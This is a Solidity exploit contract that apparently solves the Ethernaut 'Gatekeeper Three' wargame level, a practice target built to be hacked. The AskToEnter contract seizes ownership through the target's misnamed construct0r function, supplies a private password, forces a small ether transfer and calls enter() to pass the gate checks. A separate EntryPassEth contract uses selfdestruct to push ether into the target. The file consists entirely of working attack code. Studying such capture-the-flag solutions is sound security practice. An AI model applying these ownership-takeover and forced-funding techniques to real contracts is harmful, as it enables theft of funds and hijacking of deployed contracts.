// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract AskToEnter {
    GatekeeperThree public target;
    uint256 private password;

    constructor(address payable _target, uint256 _password) {
        target = GatekeeperThree(_target);
        password = _password;
    }

    function getEntry() public {
        target.getAllowance(password);
        require(target.allowEntrance() == true);

        target.construct0r();
        require(target.owner() == address(this));

        (bool success, ) = payable(target).call{value: 0.002 ether}("");
        require(success, "Transfer failed.");

        target.enter();
        require(target.entrant() == tx.origin, "Pass Denied");
    }
}

contract EntryPassEth {
    function fundExploit(address payable target) public payable {
        selfdestruct(target);
    }
}
